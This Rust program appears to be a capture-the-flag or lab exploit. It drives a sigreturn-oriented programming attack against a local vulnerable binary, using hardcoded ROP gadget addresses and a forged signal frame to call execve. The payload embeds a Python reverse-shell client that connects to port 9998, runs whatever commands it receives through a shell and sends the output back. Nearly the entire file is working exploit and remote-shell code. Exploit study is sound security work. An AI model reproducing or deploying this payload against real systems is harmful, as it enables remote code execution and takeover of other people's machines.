use std::{
    io::{stdin, BufRead, Read, Write},
    process::Stdio,
};

use crate::bindings::rt_sigframe;
use syscalls::Sysno;

mod bindings;

const EXAMPLE_RT_SIGFRAME: rt_sigframe =
    unsafe { std::mem::transmute(*include_bytes!("../../example_rt_sigframe.bin")) };
const POP_RAX_RET_GADGET: usize = 0x00401049;
const SYSCALL_GADGET: usize = 0x00401074;
const SHELL_CLIENT: &str = "import socket, os, subprocess; s=socket.socket(); s.connect(('0.0.0.0', 9998)); exec('while True:\\n data=s.recv(1024);\\n if data[:2].decode(\"utf-8\")==\"cd\": os.chdir(data[3:].decode(\"utf-8\"));\\n if len(data)>0: cmd=subprocess.Popen(data[:].decode(\"utf-8\"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE); output_byte=cmd.stdout.read()+cmd.stderr.read(); output_str=str(output_byte,\"utf-8\"); currentWD=os.getcwd()+\"> \"; s.send(str.encode(output_str+currentWD)); print(output_str)')";

fn struct_to_bytes<T>(s: &T) -> &[u8] {
    unsafe { std::slice::from_raw_parts((s as *const T) as *const u8, std::mem::size_of::<T>()) }
}

fn main() {
    // let mut app = std::process::Command::new("gdbserver")
    //     .arg(":2289")
    //     .arg("../main")
    let mut app = std::process::Command::new("../main")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    let mut app_stdin = app.stdin.take().unwrap();
    let mut app_stdout = app.stdout.take().unwrap();

    let mut out_buf = [0; 512];
    // Read greeting
    app_stdout
        .read_exact(&mut out_buf[.."Hello!\n".len()])
        .unwrap();

    // Wait for gdb attach
    // println!("app pid: {}, paused...", app.id());
    // let mut tmp_buf = String::new();
    // std::io::stdin().lock().read_line(&mut tmp_buf).unwrap();

    let mut payload = Vec::new();
    payload.extend_from_slice(b"\0-c\0");
    let cur_payload_len = payload.len();
    payload.extend_from_slice(&vec![b'A'; 16 - cur_payload_len]);
    const SP: usize = 0x7fffffffd7c8;
    payload.extend_from_slice(&POP_RAX_RET_GADGET.to_ne_bytes());
    payload.extend_from_slice(&(Sysno::rt_sigreturn as u64).to_ne_bytes());
    payload.extend_from_slice(&SYSCALL_GADGET.to_ne_bytes());
    let sigframe_start = payload.len();
    // Will replace by one with correct data
    payload.extend_from_slice(&struct_to_bytes(&EXAMPLE_RT_SIGFRAME)[8..]);
    let sigframe_end = payload.len();

    let shell_client_addr = SP + payload.len() - 16;
    payload.extend_from_slice(SHELL_CLIENT.as_bytes());
    payload.push(b'\0');

    // program path
    let python_path_addr = SP + payload.len() - 16;
    payload.extend_from_slice(b"/usr/bin/python\0");

    // args array
    let args_arr_addr = SP + payload.len() - 16;
    payload.extend_from_slice(&(python_path_addr as u64).to_le_bytes()); // /usr/bin/python\0
    payload.extend_from_slice(&((SP - 16 + 1) as u64).to_le_bytes()); // -c\0
    payload.extend_from_slice(&(shell_client_addr as u64).to_le_bytes()); // SHELL_CLIENT\0
    payload.extend_from_slice(&0x0_u64.to_le_bytes()); // Null terminate args array

    // overwrite sigframe with correct addreses
    let mut sigframe = EXAMPLE_RT_SIGFRAME;
    sigframe.uc.uc_mcontext.ip = SYSCALL_GADGET as u64;
    sigframe.uc.uc_mcontext.ax = Sysno::execve as u64;
    sigframe.uc.uc_mcontext.di = python_path_addr as u64; // /usr/bin/python\0
    sigframe.uc.uc_mcontext.si = args_arr_addr as u64; // args arr
    sigframe.uc.uc_mcontext.dx = 0x0; // env arr
    payload[sigframe_start..sigframe_end].copy_from_slice(&struct_to_bytes(&sigframe)[8..]);

    assert!(!payload.contains(&b'\n'));

    payload.push(b'\n');

    app_stdin.write_all(&payload).unwrap();
    println!("payload wrote");
    app_stdout.read_exact(&mut out_buf[..16]).unwrap();
    println!("read done");

    // Finish
    app_stdin.write_all(b"\n").unwrap();

    app.wait().unwrap();
}
